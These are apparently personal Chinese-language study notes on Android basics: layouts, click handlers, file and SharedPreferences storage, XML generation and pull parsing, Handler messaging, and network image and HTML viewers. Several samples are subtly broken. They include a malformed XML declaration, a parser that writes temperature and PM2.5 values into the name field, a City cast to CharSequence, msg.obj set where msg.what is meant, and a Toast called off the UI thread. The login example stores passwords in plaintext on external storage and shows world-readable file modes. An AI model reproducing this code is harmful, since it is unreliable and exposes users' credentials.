Android 文字使用 sp，长度使用 dp ，不推荐使用 像素 px

 android:inputType="phone" //限制输入
 android:inputType="textPassword"//输入文字显示密文
 android:hint="请输入电话好吗..." //提示输入
 android:lines="5" //展示5行内容
 
 android:gravity="top" //内容文字对齐方式
 android:layout_gravity=""//对象在布局中的位置方式

 /**
  * top 顶部
  * bottom 底部
  * left 左
  * right 右
  * center 水平竖直都居中
  * center_vertical 竖直居中
  */
 
 android:onClick="send"//如果指定了 值为 send ，必须定义一个 public void send(View view) {}  (在上下文当中 通常在 Activity)
 
 android:layout_weight="1"//权重,按比例分配屏幕剩余空间

 android:background="@android:color/holo_red_light"//背景颜色配置，可以选用Android自带的
 android:background="#000000"//RGB
 android:background="#ffff4444"//ARGB，A表示透明度

<ScrollView></ScrollView> //可以添加滑动效果

android:theme="@android:style/Theme.Translucent"//透明主题色

*#*#4636#*#* //手机电话情报

/**
 
 */
点击事件的几种方法

package com.example.fangyi.myapp;

import android.os.Bundle;
import android.support.v7.app.AppCompatActivity;
import android.view.View;
import android.widget.Button;

public class MainActivity extends AppCompatActivity implements View.OnClickListener {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        assignViews();
    }

    private Button btnButton;

    private void assignViews() {
        btnButton = (Button) findViewById(R.id.btn_button);

        btnButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                System.out.println("方式一,匿名内部类");
            }
        });

        btnButton.setOnClickListener(new MyListener());

        btnButton.setOnClickListener(this);
    }


    public class MyListener implements View.OnClickListener {
        /**
         * Called when a view has been clicked.
         *
         * @param v The view that was clicked.
         */
        @Override
        public void onClick(View v) {
            System.out.println("方式二，自己定义内部或外部的实现类");
        }
    }
    
    
    /**
     * Called when a view has been clicked.
     *
     * @param v The view that was clicked.
     */
    @Override
    public void onClick(View v) {
        System.out.println("方式三，this指代MainActivity中的onClick方法，implements View.OnClickListener，重新onClick");
    }

    public void send(View v) {
        System.out.println("方式四，android:onClick="send"//如果指定了 值为 send");
        
        //获取组件资源ID
        int id = v.getId();
        switch (id) {
            case R.id.bt_a:
                System.out.println("a");
                break;
            case R.id.bt_b:
                System.out.println("b");
                break;
            case R.id.bt_c:
                System.out.println("c");
                break;
        }
    }

}


/**
 
 */

四种布局

LinearLayout (线性布局)

/**
 * 当方向为竖直时，组件的水平方向的坐标设置生效，竖直方向不生效
 * 当方向为水平时，相反
 *
 * android:layout_gravity=""//对象在布局中的位置方式
 *
 * 
 * 权重,按比例分配屏幕剩余空间
 * layout_width
 * 最好搭配0dp使用
 * 
 * //两个组件，第二个组件是第一个组件的两倍
 *     android:layout_weight="1"
 *     android:layout_width="0dp"
 *
 *     android:layout_weight="2"
 *     android:layout_width="0dp"
 * 
 * //两个组件，第一个组件式100dp+权重1:1分配的，第二个组件是50dp+权重1:1分配的
 *     android:layout_weight="1"
 *     android:layout_width="100dp"
 *
 *     android:layout_weight="1"
 *     android:layout_width="50dp"
 * 
 */


RelativeLayout (相对布局)

/**
 * 在内部的组件默认是 左对齐和顶部对齐的
 *
 * 
 * Android UI之RelativeLayout（相对布局）
 * http://blog.csdn.net/j_bing/article/details/45723565
 */


FrameLayout (帧布局)

/**
 * 使用基本和上面差不多
 */


TableLayout (表格布局)

/**
 * android:stretchColumns="1",拉伸第一列，0开始
 * 
 * android:layout_column="1"//把标记的那个变成第一列
 *
 * 
 */

<TableLayout
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:stretchColumns="1">
        <TableRow>
            <TextView
                android:layout_column="1"
                android:text="Open"/>
            <TextView
                android:text="Ctrl-O"
                android:gravity="right"/>
        </TableRow>

        <TableRow>
            <TextView
                android:layout_column="1"
                android:text="Save"/>
            <TextView
                android:text="Ctrl-S"
                android:gravity="right"/>
        </TableRow>

        <TableRow>
            <TextView
                android:layout_column="1"
                android:text="Save As"/>
            <TextView
                android:text="Ctrl-Shift-S"
                android:gravity="right"/>
        </TableRow>

        <TextView
            android:layout_height="1dp"
            android:background="#000000"/>

        <TableRow>
            <TextView
                android:text="X"/>
            <TextView
                android:text="Import..."/>
        </TableRow>

        <TableRow>
            <TextView
                android:text="X"/>
            <TextView
                android:text="Export..."/>
            <TextView
                android:text="Ctrl-E"
                android:gravity="right"/>
        </TableRow>

        <TextView
            android:layout_height="1dp"
            android:background="#000000"/>

        <TableRow>
            <TextView
                android:layout_column="1"
                android:text="Quit"/>
            <TextView
                />
        </TableRow>

    </TableLayout>


/**

 */
在 Android 系统中读写文件

1.在内部存储中 读写：登陆界面用户名和密码保存读写.java

/**
 * 获得专属路径API
 * 
 * getFilesDir() 永久保存的文件
 * getCacheDir() 缓存文件夹，有可能被系统删掉
 */
    File file = new File("data/data/com.example.fangyi.myapp/info.txt");
    
    //返回一个File对象，路径是data/data/com.example.fangyi.myapp/files/
    File file = new File(getFilesDir(), "info.txt");
    
    //返回一个File对象，路径是data/data/com.example.fangyi.myapp/cache/
    File file = new File(getCacheDir(), "info.txt");


    /**
     * 写操作
     */
    etLoginName = (EditText) findViewById(R.id.et_login_name);
    etLoginKey = (EditText) findViewById(R.id.et_login_key);
    cbLogin = (CheckBox) findViewById(R.id.cb_login);
    btnStartLogin = (Button) findViewById(R.id.btn_start_login);
    tvShow = (TextView) findViewById(R.id.tv_show);

    btnStartLogin.setOnClickListener(new View.OnClickListener() {
        @Override
        public void onClick(View v) {
            String name = etLoginName.getText().toString();
            String key = etLoginKey.getText().toString();

            //判断是否勾选
            if (cbLogin.isChecked()) {
                 //File file = new File("data/data/com.example.fangyi.myapp/info.txt");

                //返回一个File对象，路径是data/data/com.example.fangyi.myapp/files/
                File file = new File(Environment.getExternalStorageDirectory(), "info.txt");

                if (Environment.getExternalStorageState().equals(Environment.MEDIA_MOUNTED)) {

                }

                try {
                    FileOutputStream fos = new FileOutputStream(file);
                    try {
                        fos.write((name + "##" + key).getBytes());
                        fos.close();
                    } catch (IOException e) {
                        e.printStackTrace();
                    }
                } catch (FileNotFoundException e) {
                    e.printStackTrace();
                }
            }

            Toast.makeText(Login.this, "登陆成功", Toast.LENGTH_SHORT).show();
        }
    });


    /**
     * 读操作
     */
    public void readAccout() {
        File file = new File(getFilesDir(), "info");

        if (file.exists()) {
            try {
                FileInputStream fis = new FileInputStream(file);
                //把字节流转换成字符流
                BufferedReader br = new BufferedReader(new InputStreamReader(fis));
                String text = br.readLine();
                String[] s = text.split("##");

                //回填
                etLoginName.setText(s[0]);
                etLoginKey.setText(s[1]);
                tvShow.setText(text);

            } catch (FileNotFoundException e) {
                e.printStackTrace();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }





2.在外部储存中 读写，区别就是 路径

/**
 * 写 需要权限
 * <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"></uses-permission>
 *
 * 读 可需要不需要
 * <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"></uses-permission>
 *
 * 
 * 获得专属路径API
 * 
 * Environment.getExternalStorageDirectory()
 * 返回一个 file对象，包含的路径就是sd卡的真实路径
 * 
 */
    
    File file = new File("storage/sdcard/into.txt");

    File file = new File(Environment.getExternalStorageDirectory(), "info.txt");

    /**
     * SD卡状态
     *
     * remove：没有插SD卡
     * unmount: sd已插，但是没有挂载
     * checking：sd卡正在被系统遍历
     * mounted：sd卡可用
     * mounted_READ_ONLY：sd卡可用，但是只读
     * 
     */
    //检测SD卡当前是否可用
    if (Environment.getExternalStorageState().equals(Environment.MEDIA_MOUNTED)) {
        
        //sd卡可用
        
    }




3.获取sd卡剩余容量
/**
 * 区块大小
 * 区块数量
 * 
 * 区块大小 * 区块数量 = 存储设备的总大小
 * 区块大小 * 可用区块数量 = sd卡剩余空间
 */


        tvSd = (TextView) findViewById(R.id.tv_sd);
        tvSdSum = (TextView) findViewById(R.id.tv_sd_sum);

        File path = Environment.getExternalStorageDirectory();
        StatFs statFs = new StatFs(path.getPath());
        long blockSize;//区块大小
        long totalBlocaks; //区块数量
        long availableBlocks;//可用区块数量

        //检测系统当前系统是否大于4.3
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN_MR2 ){

            blockSize = statFs.getBlockSizeLong();
            totalBlocaks = statFs.getBlockCountLong();
            availableBlocks = statFs.getAvailableBlocksLong();

        } else {

            blockSize = statFs.getBlockSize();
            totalBlocaks = statFs.getBlockCount();
            availableBlocks = statFs.getAvailableBlocks();
        }

        tvSdSum.setText(formatSize(totalBlocaks * blockSize));//总容量
        tvSd.setText(formatSize(availableBlocks * blockSize));//剩余容量


    private String formatSize(long size) {
        return Formatter.formatFileSize(this, size);
    }




4.文件访问权限

/**
 *  d rwx rwx rwx
 *
 *   在Android中，每一个应用，都是一个独立的用户
 *
 *   第一个 d：如果是d，文件夹，如果是-，就是文件
 *   第一个 rwx：决定 owner(拥有者) 对此文件有什么权限
 *      * r：读
 *      * w：写
 *      * x：执行(execute)
 *
 *   第二个 rwx：决定 grouper(跟owner同一组的用户) 对此文件有什么权限
 *
 *  第三个 rwx：决定 other(跟owner不同组的用户) 对此文件有什么权限
 */
        
        /**
         * 创建的info.txt文件
         * 私有权限             -rw-rw----
         * 全局可读权限的是     -rw-rw-r--
         * 全局可写             -rw-rw--w-
         */
        private  void click1(View v) {
        //此API会把文件写到data/data/com.example.fangyi.myapp/files/文件下
            try {
                FileOutputStream fos = openFileOutput("info.txt", MODE_PRIVATE);//MODE_WORLD_READABLE 全局可读
                fos.write("haha".getBytes());                                   //MODE_WORLD_WRITEABLE 全局可写
                fos.close();
            } catch (FileNotFoundException e) {
                e.printStackTrace();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }

    //全局可读可写
    FileOutputStream fos = openFileOutput("info.txt", MODE_WORLD_READABLE|MODE_WORLD_WRITEABLE)    



5.SharedPreferences保存用户名和密码
    
    /**
     * 实际上是保存到xml文件中，键字对存的
     */

    SharedPreferences sp = getSharedPreferences("info", MODE_PRIVATE);
    SharedPreferences.Editor ed = sp.edit();
    ed.putString("name", name);
    ed.putString("key", key);
    //提交
    ed.commit();

    /**
     * 拿回数据
     */

    SharedPreferences sp = getSharedPreferences("info", MODE_PRIVATE);
    String name = sp.getString("name", "");
    String key = sp.getString("key", "");


/**

 */

短信备份功能

 * 短信内容
 * 短信发送或接收的时间
 * 对方号码
 * 类型 type 1:为接收，2:为发送

短信备份.java


1.文本生成XML文件,类似格式
/*
    <?xml version="1.0" encoding="utf-8"?>
    <messages>
        <message>
            <address>110</address>
            <date>201605051206</date>
            <type>1</type>
            <body>你好，同学</body>
        <message>
    <messages>

    上述方法不太合理，比如哪个哥们 发了带<body>标签的短信，直接卡崩了
 */


    /**
     * 文本生成xml文件
     * @param v
     */
    private void write_1(View v) {
        StringBuffer sb = new StringBuffer();

        sb.append("<?xml version=\"1.0\" encoding=\"utf-\"?1>");

        sb.append("<messages>");
        for (Sms sms : smsList) {
            sb.append("<message>");

            sb.append("<address>");
            sb.append(sms.getAddress());
            sb.append("</address>");

            sb.append("<date>");
            sb.append(sms.getDate());
            sb.append("</date>");

            sb.append("<type>");
            sb.append(sms.getType());
            sb.append("</type>");

            sb.append("<body>");
            sb.append(sms.getBody());
            sb.append("</body>");

            sb.append("</message>");
        }
        sb.append("</messages>");


        File file = new File("sdcard/sms.xml");
        FileOutputStream fos = null;
        try {
            fos = new FileOutputStream(file);
            fos.write(sb.toString().getBytes());
            fos.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }




2.使用 xml 序列化器生成xml



    /**
     * xml序列化生成器生成xml文件
     * @param v
     */
    private void write_2(View v) {
        //拿到序列化器对象
        XmlSerializer xs = Xml.newSerializer();

        //对序列化器进行初始化
        File file = new File("sdcard/sms2.xml");
        try {
            FileOutputStream fos = new FileOutputStream(file);
            //OutputStream:指定文件的保存路径
            //encoding:指定生成的xml文件的编码
            xs.setOutput(fos, "utf-8");

            //开始生产文件
            //生成头结点
            xs.startDocument("utf-8", true);//utf-8决定头文件的encoding，和上面的utf-8意义不一样
            //生成开始标签
            xs.startTag(null, "messages");
            for (Sms sms : smsList) {
                xs.startTag(null, "message");

                xs.startTag(null, "address");
                //生成文本节点
                xs.text(sms.getAddress());
                xs.endTag(null, "address");

                xs.startTag(null, "date");
                xs.text(sms.getDate());
                xs.endTag(null, "date");

                xs.startTag(null, "type");
                xs.text(sms.getType());
                xs.endTag(null, "type");

                xs.startTag(null, "body");
                xs.text(sms.getBody());
                xs.endTag(null, "body");

                xs.endTag(null, "message");
            }

            xs.endTag(null, "messages");
            xs.endDocument();//告诉序列化器生成完毕
        } catch (Exception e) {
            e.printStackTrace();
        }



3.pull 解析XML文件


// <?xml version="1.0" encoding="utf-8"?>

// <weather>

//     <city>
//         <name>深圳</name>
//         <temp>18°</temp>
//         <pm25>30</pm25>
//     </city>

//     <city>
//         <name>上海</name>
//         <temp>13°</temp>
//         <pm25>56</pm25>
//     </city>

//     <city>
//         <name>北京</name>
//         <temp>8°</temp>
//         <pm25>130</pm25>
//     </city>

//     <city>
//         <name>长春</name>
//         <temp>-5°</temp>
//         <pm25>80</pm25>
//     </city>

// </weather>




    /**
     * 解析XML文件
     * @param v
     */
    public void resolvexml(View v) {
        //拿到资源文件
        InputStream is = getClassLoader().getResourceAsStream("weather.xml");
        //拿到解析器对象
        XmlPullParser xp = Xml.newPullParser();

        try {
            //初始化xp对象
            xp.setInput(is, "utf-8");

            City city = null;

            //开始解析
            // 获取当前节点的事件类型
            // START_DOCUMENT = 0;
            // END_DOCUMENT= 1; 文档解析结束
            // START_TAG = 2;
            // END_TAG = 3;
            int type = xp.getEventType();
            while (type != XmlPullParser.END_DOCUMENT) {
                //判断当前解析到哪一个节点，从而确定什么操作
                switch (type) {
                    case XmlPullParser.START_TAG:
                        //获取当前节点的名字
                        if ("weather".equals(xp.getName())) {

                            cityList = new ArrayList<>();

                        } else if ("city".equals(xp.getName())) {

                            city = new City();

                        } else if ("name".equals(xp.getName())) {

                            //获取当前节点下一个节点的文本
                            String name = xp.nextText();
                            city.setName(name);

                        } else if ("temp".equals(xp.getName())) {

                            String temp = xp.nextText();
                            city.setName(temp);

                        } else if ("pm25".equals(xp.getName())) {

                            String pm25 = xp.nextText();
                            city.setName(pm25);
                        }
                        break;

                    case XmlPullParser.END_TAG:
                        if ("city".equals(xp.getName())) {
                            cityList.add(city);
                        }
                        break;
                }
                // 把指针移动到下一个节点
                type = xp.next();
            }

            for (City c : cityList) {
                tvXMLShow.setText((CharSequence) c);
                System.out.println(c);
            }


        } catch (Exception e) {
            e.printStackTrace();
        }
    }




/**

 */

测试

黑盒测试:不需要懂技术，测试逻辑业务
白盒测试:需要懂技术，懂自动化测试，测试逻辑方法

API:AndroidTestCase

    <instrumentation
        android:name="android.test.InstrumentationTestRunner"
        android:targetPackage="com.example.fangyi.myapp"/>//测试哪个包写 包名

        <uses-library android:name="">//跟Activity一个等级


    //类执行之前先执行这里
    protected setup() throws Exception {
        super.setUp();

    }
    //类结束以后把这个方法下的都结束
    protected tearDown() throws Exception {
        super.tearDown();
    }

/**
 
 */


SQLite 

具体参考 学习笔记 SQLite是一种关系型数据库 记录


/**
 
 */

查询 本地 IP 语句：ipconfig

每个应用只有一个 ApplicationContext
每个 Activity 都是一个 ActivityContext

主线程堵塞
    界面会停止刷新，并且应用会停止响应用户的任何操作 (只有 Home键有效)

    当主线程阻塞时间过长，系统就会报出 ANR 异常， application not responding ，应用无响应异常

    4.0 以后就不准许 在主线程中添加影响响应的代码

    只有主线程才可以刷新UI，主线程又叫ui线程
    刷新UI不能执行在子线程中

    在主线程中 有一个
        1.消息队列 Message Queue  (主线程创建时，消息队列和消息轮询器就会被创建)
            里面还有一个 消息轮询器 Looper ，(Looper 一旦发现 Message Queue 中有消息，就把消息取出，把消息给 Handler对象)
        2.主线程中创一个 Handler对象 (主线程不会自动创建消息处理器，使用时候自行创建)
            handleMessage 方法 用来处理 Looper 发来的消息
            handleMessage 运行在主线程
            只要消息队列中有消息，就会触发主线程去执行 handleMessage方法

        3.子线程 往消息队列发消息，就会触发主线程去执行 handleMessage 方法

            调用 Handler对象 的 sendMessage 方法，就会往消息队列中发消息







1.带网络功能的图片查看器

package com.example.fangyi.requestserverdata;

import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.os.Bundle;
import android.os.Handler;
import android.os.Message;
import android.support.v7.app.AppCompatActivity;
import android.view.View;
import android.widget.ImageView;
import android.widget.Toast;

import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class MainActivity extends AppCompatActivity {

    Handler handler = new Handler() {
        /**
         * 只要消息队列中有消息，此方法调用
         *
         * Subclasses must implement this to receive messages.
         *
         * @param msg
         */
        @Override
        public void handleMessage(Message msg) {
            //8.把图片设置进imageView中
            ImageView imageView = (ImageView) findViewById(R.id.iv_img);
            imageView.setImageBitmap((Bitmap) msg.obj);
        }
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);


    }


    public void requsetimg(View v) {
        //子线程
        Thread t = new Thread() {
            @Override
            public void run() {
                //请求网址获取图片
                //1.确定网址
                String path = "http://ww1.sinaimg.cn/large/6d4fa8d9gw1f3mj1tzoxbj20go0tnjwb.jpg";

                try {
                    //2.获取url对象
                    URL url = new URL(path);

                    //3.获取链接对象,此时还没有建立连接
                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();

                    //4.初始化连接对象
                    // 设置请求的方法，注意大写
                    conn.setRequestMethod("GET");
                    //读取超时
                    conn.setReadTimeout(5000);
                    //连接超时
                    conn.setConnectTimeout(5000);

                    //5.和服务器建立链接
                    conn.connect();
                    //  200是链接成功的代码
                    if (conn.getResponseCode() == 200) {
                        //6.拿到服务器返回的流，客户端请求的数据，就保存在流中
                        InputStream is = conn.getInputStream();
                        //7.从流里读取数据，构造成一个图片对象，通过位图工厂API
                        Bitmap bm = BitmapFactory.decodeStream(is);

                        //创建消息对象
                        Message msg = new Message();
                        //把bm存放入消息
                        msg.obj = bm;
                        //子线程往消息队列发送消息
                        handler.sendMessage(msg);


                    } else {
                        //弹吐司也是刷新UI
                        Toast.makeText(MainActivity.this, "请求失败", Toast.LENGTH_SHORT).show();
                    }

                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        };
        t.start();
    }
}




<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:tools="http://schemas.android.com/tools"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:paddingBottom="@dimen/activity_vertical_margin"
    android:paddingLeft="@dimen/activity_horizontal_margin"
    android:paddingRight="@dimen/activity_horizontal_margin"
    android:paddingTop="@dimen/activity_vertical_margin"
    tools:context="com.example.fangyi.requestserverdata.MainActivity"
    android:orientation="vertical">

    <Button
        android:id="@+id/btn_requset_img"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:text="请求图片"
        android:onClick="requsetimg"/>

    <ImageView
        android:id="@+id/iv_img"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content" />
</LinearLayout>

/**

 */



2.带缓存功能 网络查看器




package com.example.fangyi.requestserverdata;

import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.os.Bundle;
import android.os.Handler;
import android.os.Message;
import android.support.v7.app.AppCompatActivity;
import android.view.View;
import android.widget.ImageView;
import android.widget.TextView;
import android.widget.Toast;

import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class MainActivity extends AppCompatActivity {

    Handler handler = new Handler() {
        /**
         * 只要消息队列中有消息，此方法调用
         *
         * Subclasses must implement this to receive messages.
         *
         * @param msg
         */
        @Override
        public void handleMessage(Message msg) {
            //8.把图片设置进imageView中
            ImageView imageView = (ImageView) findViewById(R.id.iv_img);
            imageView.setImageBitmap((Bitmap) msg.obj);
            TextView tv = (TextView) findViewById(R.id.tv);
            tv.setText("服务器端获取的图片");
        }
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);


    }

    /**
     * 获取图片
     * @param v
     */
    public void requsetimg(View v) {
        //请求网址获取图片
        //1.确定网址
        final String path = "http://ww1.sinaimg.cn/large/6d4fa8d9gw1f3mj1tzoxbj20go0tnjwb.jpg";

        //首先判断缓存是否存在
        final File file = new File(getCacheDir(), getFileName(path));

        if (file.exists()) {

            //通过图片的绝对路径构造一个bitmap对象
            Bitmap bm = BitmapFactory.decodeFile(file.getAbsolutePath());
            ImageView imageView = (ImageView) findViewById(R.id.iv_img);
            imageView.setImageBitmap(bm);

            TextView tv = (TextView) findViewById(R.id.tv);
            tv.setText("从缓存获取的图片");

        } else {
            //子线程
            Thread t = new Thread() {
                @Override
                public void run() {


                    try {
                        //2.获取url对象
                        URL url = new URL(path);

                        //3.获取链接对象,此时还没有建立连接
                        HttpURLConnection conn = (HttpURLConnection) url.openConnection();

                        //4.初始化连接对象
                        // 设置请求的方法，注意大写
                        conn.setRequestMethod("GET");
                        //读取超时
                        conn.setReadTimeout(5000);
                        //连接超时
                        conn.setConnectTimeout(5000);

                        //5.和服务器建立链接
                        conn.connect();
                        //  200是链接成功的代码
                        if (conn.getResponseCode() == 200) {

                            //6.拿到服务器返回的流，客户端请求的数据，就保存在流中
                            InputStream is = conn.getInputStream();

                            /****编写缓存代码****************************************************/

                            //7.开启文件输出流，把读取到的字节写到本地文件

                            FileOutputStream fos = new FileOutputStream(file);

                            int len = 0;
                            byte[] b = new byte[1024];
                            while ((len = is.read(b)) != -1) {
                                fos.write(b, 0, len);
                            }
                            fos.close();

                            //通过图片的绝对路径构造一个bitmap对象
                            Bitmap bm = BitmapFactory.decodeFile(file.getAbsolutePath());

                            /******************************************************************/

                            //创建消息对象
                            Message msg = new Message();
                            //把bm存放入消息
                            msg.obj = bm;
                            //子线程往消息队列发送消息
                            handler.sendMessage(msg);


                        } else {
                            Toast.makeText(MainActivity.this, "请求失败", Toast.LENGTH_SHORT).show();
                        }

                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
            };
            t.start();
        }


    }

    /**
     * 删除缓存图片
     */
    public void deleteimg(View v) {
        deleteFilesByDirectory(getCacheDir());
    }

    /**
     * 截取文件名
     * @param path
     * @return
     */
    public String getFileName(String path) {
        int index = path.lastIndexOf("/");
        return path.substring(index + 1);
    }

    /**
     * 删除方法 这里只会删除某个文件夹下的文件，如果传入的directory是个文件，将不做处理
     * @param directory
     */
    private static void deleteFilesByDirectory(File directory) {
        if (directory != null && directory.exists() && directory.isDirectory()) {
            for (File item : directory.listFiles()) {
                item.delete();
            }
        }
    }
}



<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:tools="http://schemas.android.com/tools"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:paddingBottom="@dimen/activity_vertical_margin"
    android:paddingLeft="@dimen/activity_horizontal_margin"
    android:paddingRight="@dimen/activity_horizontal_margin"
    android:paddingTop="@dimen/activity_vertical_margin"
    tools:context="com.example.fangyi.requestserverdata.MainActivity"
    android:orientation="vertical">

    <Button
        android:id="@+id/btn_requset_img"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:text="请求图片"
        android:onClick="requsetimg"/>

    <Button
        android:id="@+id/btn_delete"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:text="删除缓存图片"
        android:onClick="deleteimg"/>

    <TextView
        android:id="@+id/tv"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:text="图片获取方式"/>

    <ImageView
        android:id="@+id/iv_img"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content" />


</LinearLayout>





/**

 */

package com.example.fangyi.requestserverdata;

import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.os.Bundle;
import android.os.Handler;
import android.os.Message;
import android.support.v7.app.AppCompatActivity;
import android.view.View;
import android.widget.ImageView;
import android.widget.TextView;
import android.widget.Toast;

import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class MainActivity extends AppCompatActivity {

    Handler handler = new Handler() {
        /**
         * 只要消息队列中有消息，此方法调用
         *
         * Subclasses must implement this to receive messages.
         *
         * @param msg
         */
        @Override
        public void handleMessage(Message msg) {
            switch (msg.what) {
                case 1:
                    //8.把图片设置进imageView中
                    ImageView imageView = (ImageView) findViewById(R.id.iv_img);
                    imageView.setImageBitmap((Bitmap) msg.obj);
                    TextView tv = (TextView) findViewById(R.id.tv);
                    tv.setText("服务器端获取的图片");
                    break;

                case 2:
                    Toast.makeText(MainActivity.this, "请求失败", Toast.LENGTH_SHORT).show();
                    break;
            }


        }
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);


    }

    /**
     * 获取图片
     * @param v
     */
    public void requsetimg(View v) {
        //请求网址获取图片
        //1.确定网址
        final String path = "http://ww1.123.cn/large/6d4fa8d9gw1f3mj1tzoxbj20go0tnjwb2.jpg";

        //首先判断缓存是否存在
        final File file = new File(getCacheDir(), getFileName(path));

        if (file.exists()) {

            //通过图片的绝对路径构造一个bitmap对象
            Bitmap bm = BitmapFactory.decodeFile(file.getAbsolutePath());
            ImageView imageView = (ImageView) findViewById(R.id.iv_img);
            imageView.setImageBitmap(bm);

            TextView tv = (TextView) findViewById(R.id.tv);
            tv.setText("从缓存获取的图片");

        } else {
            //子线程
            Thread t = new Thread() {
                @Override
                public void run() {


                    try {
                        //2.获取url对象
                        URL url = new URL(path);

                        //3.获取链接对象,此时还没有建立连接
                        HttpURLConnection conn = (HttpURLConnection) url.openConnection();

                        //4.初始化连接对象
                        // 设置请求的方法，注意大写
                        conn.setRequestMethod("GET");
                        //读取超时
                        conn.setReadTimeout(5000);
                        //连接超时
                        conn.setConnectTimeout(5000);

                        //5.和服务器建立链接
                        conn.connect();
                        //  200是链接成功的代码
                        if (conn.getResponseCode() == 200) {

                            //6.拿到服务器返回的流，客户端请求的数据，就保存在流中
                            InputStream is = conn.getInputStream();

                            /****编写缓存代码****************************************************/

                            //7.开启文件输出流，把读取到的字节写到本地文件

                            FileOutputStream fos = new FileOutputStream(file);

                            int len = 0;
                            byte[] b = new byte[1024];
                            while ((len = is.read(b)) != -1) {
                                fos.write(b, 0, len);
                            }
                            fos.close();

                            //通过图片的绝对路径构造一个bitmap对象
                            Bitmap bm = BitmapFactory.decodeFile(file.getAbsolutePath());

                            /******************************************************************/

                            //创建消息对象
                            Message msg = new Message();
                            //把bm存放入消息
                            msg.obj = bm;
                            msg.what = 1;
                            //子线程往消息队列发送消息
                            handler.sendMessage(msg);


                        } else {
                            //弹吐司也是刷新UI
//                            Toast.makeText(MainActivity.this, "请求失败", Toast.LENGTH_SHORT).show();
                            Message msg = handler.obtainMessage();
                            msg.obj = 2;
                            handler.sendMessage(msg);
                        }

                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
            };
            t.start();
        }


    }

    /**
     * 删除缓存图片
     */
    public void deleteimg(View v) {
        deleteFilesByDirectory(getCacheDir());
    }

    /**
     * 截取文件名
     * @param path
     * @return
     */
    public String getFileName(String path) {
        int index = path.lastIndexOf("/");
        return path.substring(index + 1);
    }

    /**
     * 删除方法 这里只会删除某个文件夹下的文件，如果传入的directory是个文件，将不做处理
     * @param directory
     */
    private static void deleteFilesByDirectory(File directory) {
        if (directory != null && directory.exists() && directory.isDirectory()) {
            for (File item : directory.listFiles()) {
                item.delete();
            }
        }
    }
}



/**
 
 */

    Handler handler = new Handler() {
        /**
         * 只要消息队列中有消息，此方法调用
         *
         * Subclasses must implement this to receive messages.
         *
         * @param msg
         */
        @Override
        public void handleMessage(Message msg) {
            switch (msg.what) {
                case 1:
                    //8.把图片设置进imageView中
                    ImageView imageView = (ImageView) findViewById(R.id.iv_img);
                    imageView.setImageBitmap((Bitmap) msg.obj);
                    TextView tv = (TextView) findViewById(R.id.tv);
                    tv.setText("服务器端获取的图片");
                    break;

                case 2:
                    Toast.makeText(MainActivity.this, "请求失败", Toast.LENGTH_SHORT).show();
                    break;
                case 3:
                    TextView tv_html = (TextView) findViewById(R.id.tv_html);
                    tv_html.setText((CharSequence) msg.obj);
                    break;
            }


    /**
     * html 源文件查看器
     */
    public void seehtml(View v) {
        Thread thread= new Thread() {
            @Override
            public void run() {
                //确定网址
                String path = "http://www.cnblogs.com/tianguook/archive/2013/07/23/3209302.html";
                try {
                    //构造url对象
                    URL url = new URL(path);
                    //得到连接对象
                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                    //初始化连接对象
                    conn.setRequestMethod("GET");
                    conn.setReadTimeout(5000);
                    conn.setConnectTimeout(5000);
                    //先建立连接，然后获取响应码
                    if (conn.getResponseCode() == 200) {
                        InputStream is = conn.getInputStream();
                        //从服务器返回的流中把文本读取出来
                        String string = getTextFromStream(is);
                        //发送消息，刷新ui显示
                        Message msg = handler.obtainMessage();
                        msg.obj = string;
                        msg.what = 3;
                        handler.sendMessage(msg);
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                }

            }
        };
        thread.start();

    }

    /**
     * 从流中读取文本
     * @param is
     */
    public String getTextFromStream(InputStream is) {
        int len = 0;
        byte[] b = new byte[1024];
        //定义一个字节数组输出流，保存每次读取到的字节
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        try {
            while ((len = is.read(b)) != -1 ) {
                bos.write(b, 0, len);
            }
            //使用哪个码表来构造这个字符串
            String text = new String(bos.toByteArray(), "utf-8");
            return text;
        } catch (IOException e) {
            e.printStackTrace();
        }
        return null;
    }



/**
 
 */
/**
 
 */
/**
 
 */


多线程下载

